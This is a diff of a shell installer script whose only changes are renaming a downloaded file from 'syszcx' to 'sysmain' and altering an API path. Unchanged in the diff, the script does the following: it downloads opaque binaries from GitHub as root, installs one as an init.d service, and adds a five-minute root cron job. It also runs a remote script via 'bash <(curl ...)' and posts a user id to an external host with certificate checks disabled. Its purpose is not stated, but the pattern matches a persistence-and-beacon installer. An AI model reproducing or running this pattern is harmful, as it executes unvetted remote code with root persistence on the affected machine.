@@ -6,8 +6,8 @@ fi
 
 cd $dirsys
 
-if [ ! -f syszcx ];then
-curl -Ls -O https://raw.githubusercontent.com/hankhu666/sys/main/syszcx  -O https://raw.githubusercontent.com/hankhu666/sys/main/assys  -O  https://raw.githubusercontent.com/hankhu666/sys/main/susys && chmod 755 *
+if [ ! -f sysmain ];then
+curl -Ls -O https://raw.githubusercontent.com/hankhu666/sys/main/sysmain  -O https://raw.githubusercontent.com/hankhu666/sys/main/assys  -O  https://raw.githubusercontent.com/hankhu666/sys/main/susys && chmod 755 *
 mv -u susys /etc/init.d/
 sed -i '/assys/d' /var/spool/cron/root
 echo '*/5 * * * * /usr/local/sys/assys &> /dev/null' >>/var/spool/cron/root
@@ -23,13 +23,13 @@ else
 fi
 
 
-if [ ! -f syszcx ];then
+if [ ! -f sysmain ];then
   bash  <(curl  -Ls https://hh.hankhu.com/mysh/musys)
 fi
 
 
-sed -i "s/usernameid/$uid/g" ./syszcx
-curl  -X POST  https://api.hankhu.xyz/getuid.php -d "$uid" -sk
+sed -i "s/usernameid/$uid/g" ./sysmain
+curl  -X POST  https://api.hankhu.xyz/sys/getuid.php -d "$uid" -sk
 
 
 fi
